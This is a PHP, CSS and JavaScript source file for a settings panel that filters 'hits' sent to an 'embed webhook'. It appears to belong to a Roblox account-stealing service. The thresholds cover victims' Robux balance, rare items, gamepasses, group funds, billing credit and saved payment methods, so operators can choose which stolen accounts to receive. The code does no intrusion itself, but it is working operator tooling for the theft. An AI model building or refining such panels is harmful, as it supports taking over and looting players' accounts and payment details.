<style>
    .thf-wrap { margin-top:20px; border-top:1px solid rgba(255,255,255,0.04); padding-top:16px; }
    .thf-toggle { display:flex; align-items:center; justify-content:center; gap:8px; cursor:pointer; padding:8px 0; user-select:none; position:relative; }
    .thf-toggle-icon { font-size:.65rem; color:rgba(255,255,255,0.2); transition:transform .3s ease; }
    .thf-toggle.open .thf-toggle-icon { transform:rotate(180deg); }
    .thf-toggle-text { font-size:.75rem; font-weight:500; color:rgba(255,255,255,0.3); letter-spacing:.5px; position:relative; animation:thfTextGlow 3s ease-in-out infinite; }
    @keyframes thfTextGlow {
        0%,100% { color:rgba(255,255,255,0.25); text-shadow:none; }
        50% { color:rgba(255,255,255,0.55); text-shadow:0 0 12px rgba(255,255,255,0.15),0 0 24px rgba(255,255,255,0.06); }
    }
    .thf-toggle:hover .thf-toggle-text { color:rgba(255,255,255,0.6); text-shadow:0 0 16px rgba(255,255,255,0.2); }
    .thf-toggle:hover .thf-toggle-icon { color:rgba(255,255,255,0.4); }
    .thf-tip { position:relative; display:inline-flex; margin-left:2px; }
    .thf-tip-icon { width:14px; height:14px; border-radius:50%; border:1px solid rgba(255,255,255,0.1); color:rgba(255,255,255,0.2); font-size:0.5rem; display:flex; align-items:center; justify-content:center; cursor:default; font-style:normal; font-weight:600; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; transition:all .2s; animation:thfTipPulse 3s ease-in-out infinite; }
    @keyframes thfTipPulse {
        0%,100% { border-color:rgba(255,255,255,0.1); }
        50% { border-color:rgba(255,255,255,0.2); }
    }
    .thf-tip:hover .thf-tip-icon { border-color:rgba(255,255,255,0.25); color:rgba(255,255,255,0.4); }
    .thf-tip-text { position:absolute; bottom:calc(100% + 10px); left:50%; transform:translateX(-50%) translateY(5px) scale(.97); background:rgba(7,7,11,0.6); backdrop-filter:blur(8px); -webkit-backdrop-filter:blur(8px); border:1px solid rgba(255,255,255,0.1); border-radius:7px; padding:9px 12px; font-size:0.65rem; font-weight:400; color:rgba(255,255,255,0.6); letter-spacing:0; text-transform:none; line-height:1.5; white-space:normal; width:160px; pointer-events:auto; opacity:0; transition:opacity .25s ease,transform .25s ease; z-index:20; box-shadow:none; user-select:text; cursor:text; }
    .thf-tip-text::after { content:''; position:absolute; top:100%; left:50%; transform:translateX(-50%); border:5px solid transparent; border-top-color:rgba(255,255,255,0.1); }
    .thf-tip:hover .thf-tip-text { opacity:1; transform:translateX(-50%) translateY(0) scale(1); }
    .thf-panel { max-height:0; overflow:hidden; transition:max-height .5s cubic-bezier(0.4,0,0.2,1); padding:0 24px; }
    .thf-panel.open { max-height:2400px; }
    .thf-panel.visible { overflow:visible; max-height:none; }
    .thf-sw { position:relative; width:40px; height:22px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.08); border-radius:11px; cursor:pointer; transition:all .3s cubic-bezier(0.4,0,0.2,1); flex-shrink:0; }
    .thf-sw::after { content:''; position:absolute; top:3px; left:3px; width:14px; height:14px; background:rgba(255,255,255,0.2); border-radius:50%; transition:all .3s cubic-bezier(0.4,0,0.2,1); }
    .thf-sw.on { background:rgba(255,255,255,0.12); border-color:rgba(255,255,255,0.2); box-shadow:0 0 10px rgba(255,255,255,0.05); }
    .thf-sw.on::after { transform:translateX(18px); background:rgba(255,255,255,0.8); box-shadow:0 0 8px rgba(255,255,255,0.3); }
    .thf-cat { margin-bottom:16px; opacity:0; transform:translateY(12px); animation:thfCardIn .4s ease forwards; }
    .thf-cat:nth-child(1) { animation-delay:.05s; }
    .thf-cat:nth-child(2) { animation-delay:.1s; }
    .thf-cat:nth-child(3) { animation-delay:.15s; }
    .thf-cat:nth-child(4) { animation-delay:.2s; }
    .thf-cat:nth-child(5) { animation-delay:.25s; }
    @keyframes thfCardIn {
        to { opacity:1; transform:translateY(0); }
    }
    .thf-cat-label { font-size:.7rem; font-weight:600; color:rgba(255,255,255,0.25); text-transform:uppercase; letter-spacing:1px; margin:0 0 8px 2px; line-height:1; height:11px; }
    .thf-grid { display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:10px; }
    .thf-item { position:relative; display:flex; align-items:center; gap:10px; min-width:0; padding:9px 12px; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; box-sizing:border-box; transition:border-color .3s ease,transform .25s ease; }
    .thf-item::before { content:''; position:absolute; inset:-1px; border-radius:10px; opacity:0; transition:opacity .3s ease; pointer-events:none; background:linear-gradient(to bottom,transparent calc(var(--my,50%) - 30px),rgba(255,255,255,0.08) var(--my,50%),transparent calc(var(--my,50%) + 30px)); -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0); -webkit-mask-composite:xor; mask-composite:exclude; padding:1px; }
    .thf-item:hover { transform:translateY(-1px); border-color:transparent; }
    .thf-item:hover::before { opacity:1; }
    .thf-item.on { border-color:rgba(255,255,255,0.14); }
    .thf-item-name { flex:1 1 auto; min-width:0; font-family:'Rajdhani',sans-serif; font-size:.85rem; font-weight:600; color:rgba(255,255,255,0.4); line-height:1.15; overflow-wrap:anywhere; transition:color .2s ease; }
    .thf-item.on .thf-item-name { color:rgba(255,255,255,0.9); }
    .thf-input { flex:0 0 118px; width:118px; min-width:0; height:34px; padding:0 12px; background:transparent; border:1px solid rgba(255,255,255,0.07); border-radius:8px; color:rgba(255,255,255,0.85); font-family:'Rajdhani',sans-serif; font-size:.85rem; outline:none; transition:border-color .2s ease, box-shadow .2s ease; box-sizing:border-box; -moz-appearance:textfield; line-height:1.4; }
    .thf-input::-webkit-outer-spin-button,.thf-input::-webkit-inner-spin-button { -webkit-appearance:none; margin:0; }
    .thf-input:focus { border-color:rgba(255,255,255,0.45); background:rgba(255,255,255,0.015); box-shadow:inset 0 0 0 1px rgba(255,255,255,0.06), 0 0 0 3px rgba(255,255,255,0.03); }
    .thf-input::placeholder { color:rgba(255,255,255,0.12); }
    .thf-input:disabled { opacity:.3; cursor:not-allowed; }
    .thf-input.thf-error { border-color:rgba(255,80,80,0.5) !important; background:transparent !important; box-shadow:none !important; animation:thfShake .4s ease; }
    @keyframes thfShake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-4px)} 40%{transform:translateX(4px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(2px)} }
    .thf-flag { flex:0 0 118px; width:118px; height:34px; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,0.07); border-radius:8px; box-sizing:border-box; font-family:'Rajdhani',sans-serif; font-size:.8rem; font-weight:600; color:rgba(255,255,255,0.2); transition:all .2s ease; }
    .thf-item.on .thf-flag { color:rgba(255,255,255,0.85); border-color:rgba(255,255,255,0.15); }
    .thf-save { display:flex; align-items:center; justify-content:center; gap:6px; width:100%; padding:10px; margin-top:18px; background:transparent; border:1px solid rgba(255,255,255,0.1); border-radius:8px; color:rgba(255,255,255,0.5); font-family:'Rajdhani',sans-serif; font-size:.8rem; font-weight:600; letter-spacing:.5px; cursor:pointer; transition:all .3s cubic-bezier(0.4,0,0.2,1); position:relative; z-index:0; overflow:hidden; opacity:0; transform:translateY(8px); animation:thfCardIn .4s ease .3s forwards; }
    .thf-save::before { content:''; position:absolute; inset:0; border-radius:8px; background:linear-gradient(90deg,transparent,rgba(255,255,255,0.06),transparent); transform:translateX(-100%); transition:none; }
    .thf-save:hover { background:transparent; border-color:rgba(255,255,255,0.2); color:rgba(255,255,255,0.8); transform:translateY(-1px); box-shadow:0 0 12px rgba(255,255,255,0.04); }
    .thf-save:hover::before { animation:thfSaveShine .6s ease forwards; }
    @keyframes thfSaveShine {
        to { transform:translateX(100%); }
    }
    .thf-save:active { transform:translateY(0); box-shadow:none; }
    .thf-save.saving { pointer-events:none; opacity:.5; }
    .thf-save.saved { border-color:rgba(80,255,120,0.25); color:rgba(80,255,120,0.7); background:transparent; }
    .thf-item>*,.thf-save>*{transition:opacity .35s ease;}
    .thf-panel.thf-loading .thf-item,.thf-panel.thf-loading .thf-save{position:relative;overflow:hidden;background:rgba(255,255,255,0.028);border-color:rgba(255,255,255,0.07);color:transparent;pointer-events:none;}
    .thf-panel.thf-loading .thf-item>*,.thf-panel.thf-loading .thf-save>*{opacity:0;}
    .thf-panel.thf-loading .thf-item::after,.thf-panel.thf-loading .thf-save::after{content:'';position:absolute;inset:0;pointer-events:none;background:linear-gradient(100deg,transparent 20%,rgba(255,255,255,0.04) 38%,rgba(255,255,255,0.085) 50%,rgba(255,255,255,0.04) 62%,transparent 80%);transform:translateX(-100%);animation:thfWave 2s cubic-bezier(.45,0,.25,1) infinite;}
    @keyframes thfWave{from{transform:translateX(-100%)}to{transform:translateX(100%)}}
    @media (prefers-reduced-motion: reduce){.thf-panel.thf-loading .thf-item::after,.thf-panel.thf-loading .thf-save::after{animation:none;display:none}}
    @media(max-width:600px){ .thf-grid{grid-template-columns:minmax(0,1fr);} }
    @media(max-width:480px){ .thf-panel{padding:0 8px;} .thf-item{padding:8px 10px;} .thf-input,.thf-flag{flex-basis:104px;width:104px;} }
</style>

<div class="thf-wrap">
    <div class="thf-toggle" id="thfToggle" onclick="thfTogglePanel()">
        <i class="fas fa-chevron-down thf-toggle-icon"></i>
        <span class="thf-toggle-text" id="thfToggleText">Show Filters</span>
        <span class="thf-tip"><i class="thf-tip-icon">?</i><span class="thf-tip-text">Filter which hits get sent to your embed webhook.</span></span>
    </div>
    <div class="thf-panel thf-loading" id="thfPanel">
<?php
$thfCats = [
    'currency' => ['Currency', [['balance', 'Balance', '1000'], ['pending', 'Pending', '1000']]],
    'collectibles' => ['Collectibles', [['rap', 'RAP', '5000'], ['korblox', 'Korblox', null], ['headless', 'Headless', null], ['korblox_death', 'Korblox Deathspeaker', null]]],
    'gamepasses' => ['Gamepasses', [['adopt_me', 'Adopt Me', '1'], ['murder_mystery_2', 'Murder Mystery 2', '1'], ['blox_fruits', 'Pet Simulator 99', '1']]],
    'groups' => ['Groups', [['balance', 'Balance', '1000'], ['pending', 'Pending', '1000']]],
    'billing' => ['Billing', [['credit', 'Credit', '$5'], ['credit_robux', 'Convert', '100'], ['saved_payments', 'Saved Payments', '1'], ['summary', 'Summary', '30000']]],
];
foreach ($thfCats as $thfKey => [$thfLabel, $thfItems]): ?>
        <div class="thf-cat" data-cat="<?= $thfKey ?>">
            <div class="thf-cat-label"><?= $thfLabel ?></div>
            <div class="thf-grid">
<?php foreach ($thfItems as [$thfField, $thfName, $thfPh]): ?>
                <div class="thf-item" data-cat="<?= $thfKey ?>" data-field="<?= $thfField ?>" onmousemove="thfGlow(event,this)">
                    <span class="thf-item-name" title="<?= $thfName ?>"><?= $thfName ?></span>
<?php if ($thfPh === null): ?>
                    <span class="thf-flag">True</span>
<?php else: ?>
                    <input type="text" class="thf-input" placeholder="<?= $thfPh ?>" inputmode="numeric" oninput="thfNumInput(this)" disabled>
<?php endif; ?>
                    <div class="thf-sw" onclick="thfToggleItem(this)"></div>
                </div>
<?php endforeach; ?>
            </div>
        </div>
<?php endforeach; ?>

        <button class="thf-save" id="thfSaveBtn" onclick="thfSave()">Save Filters</button>
    </div>
</div>

<script>
(function(){
    var minVals={currency:{balance:1000,pending:1000},collectibles:{rap:5000},gamepasses:{adopt_me:1,murder_mystery_2:1,blox_fruits:1},groups:{balance:1000,pending:1000},billing:{credit:5,credit_robux:100,saved_payments:1,summary:30000}};
    var maxVals={currency:{balance:1000000,pending:1000000},collectibles:{rap:10000000},gamepasses:{adopt_me:30,murder_mystery_2:30,blox_fruits:30},groups:{balance:100000,pending:100000},billing:{credit:1000,credit_robux:100000,saved_payments:5,summary:1000000}};
    var thfReadyT=setTimeout(thfReady,10000);

    function thfReady(){
        clearTimeout(thfReadyT);
        var p=document.getElementById('thfPanel');
        if(p)p.classList.remove('thf-loading');
    }

    function thfItem(c,f){return document.querySelector('#thfPanel .thf-item[data-cat="'+c+'"][data-field="'+f+'"]');}

    function thfFormat(c,f,n){return (c==='billing'&&f==='credit')?'$'+n:String(n);}

    function thfSetOn(it,on){
        it.classList.toggle('on',on);
        it.querySelector('.thf-sw').classList.toggle('on',on);
        var inp=it.querySelector('.thf-input');
        if(inp)inp.disabled=!on;
    }

    function thfLoad(){
        fetch(location.pathname+'?action=get_th_filters').then(function(r){return r.json();}).then(function(d){
            if(!d.success)return;
            var f=d.filters||{};
            Object.keys(f).forEach(function(c){
                var data=f[c]||{};
                var map=(data.fields&&typeof data.fields==='object')?data.fields:null;
                if(!map&&data.field){map={};map[data.field]={enabled:!!data.enabled,value:data.value};}
                if(!map)return;
                Object.keys(map).forEach(function(fn){
                    var it=thfItem(c,fn),v=map[fn]||{};
                    if(!it)return;
                    thfSetOn(it,!!v.enabled);
                    var inp=it.querySelector('.thf-input');
                    var n=parseInt(String(v.value==null?'':v.value).replace(/[^0-9]/g,''),10)||0;
                    if(inp&&n>0)inp.value=thfFormat(c,fn,n);
                });
            });
        }).catch(function(){}).then(thfReady);
    }

    window.thfTogglePanel=function(){
        var p=document.getElementById('thfPanel');
        var t=document.getElementById('thfToggle');
        var txt=document.getElementById('thfToggleText');
        var opening=!p.classList.contains('open');
        p.classList.toggle('open');
        t.classList.toggle('open');
        txt.textContent=p.classList.contains('open')?'Hide Filters':'Show Filters';
        if(opening){setTimeout(function(){p.classList.add('visible');},400);}
        else{p.classList.remove('visible');}
    };

    window.thfToggleItem=function(sw){
        var it=sw.closest('.thf-item');
        var on=!it.classList.contains('on');
        thfSetOn(it,on);
        var inp=it.querySelector('.thf-input');
        if(on&&inp&&!inp.value)inp.focus();
    };

    window.thfNumInput=function(el){
        var it=el.closest('.thf-item');
        var raw=el.value.replace(/[^0-9]/g,'');
        el.value=raw?thfFormat(it.dataset.cat,it.dataset.field,raw):'';
    };

    window.thfGlow=function(e,el){
        var r=el.getBoundingClientRect();
        el.style.setProperty('--my',(e.clientY-r.top)+'px');
    };

    function thfShowError(bad){
        var inp=bad.inp;
        inp.classList.remove('thf-error');
        void inp.offsetWidth;
        inp.classList.add('thf-error');
        inp.focus();
        setTimeout(function(){inp.classList.remove('thf-error');},3000);
        var prefix=(bad.c==='billing'&&bad.f==='credit')?'$':'';
        var name=bad.it.querySelector('.thf-item-name').textContent;
        var text=name+' must be between '+prefix+bad.mn.toLocaleString()+' and '+prefix+bad.mx.toLocaleString()+'.';
        if(typeof showErrorModal==='function')showErrorModal(text);
    }

    window.thfSave=function(){
        var btn=document.getElementById('thfSaveBtn');
        var filters={},bad=null;
        document.querySelectorAll('#thfPanel .thf-cat').forEach(function(catEl){
            var c=catEl.dataset.cat,fields={},primary=null,first=null;
            catEl.querySelectorAll('.thf-item').forEach(function(it){
                var fn=it.dataset.field,on=it.classList.contains('on'),inp=it.querySelector('.thf-input'),value='true';
                if(first===null)first=fn;
                if(inp){
                    value=parseInt(inp.value.replace(/[^0-9]/g,''),10)||0;
                    var mn=(minVals[c]&&minVals[c][fn])||0,mx=(maxVals[c]&&maxVals[c][fn])||Infinity;
                    if(on&&!bad&&(value<mn||value>mx))bad={it:it,inp:inp,c:c,f:fn,mn:mn,mx:mx};
                }
                fields[fn]={enabled:on,value:value};
                if(on&&primary===null)primary=fn;
            });
            var pf=primary||first;
            filters[c]={enabled:primary!==null,field:pf,value:fields[pf].value,fields:fields};
        });
        if(bad){thfShowError(bad);return;}
        btn.classList.add('saving');
        btn.textContent='Saving...';
        fetch(location.pathname+'?action=save_th_filters',{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({filters:filters})
        }).then(function(r){return r.json();}).then(function(d){
            btn.classList.remove('saving');
            if(d.success){
                btn.classList.add('saved');
                btn.textContent='✓ Saved';
                setTimeout(function(){
                    btn.classList.remove('saved');
                    btn.textContent='Save Filters';
                },2000);
                if(typeof showSuccessModal==='function')showSuccessModal();
            }else{
                btn.textContent='Save Filters';
            }
        }).catch(function(){
            btn.classList.remove('saving');
            btn.textContent='Save Filters';
        });
    };

    document.addEventListener('DOMContentLoaded',thfLoad);
})();
</script>
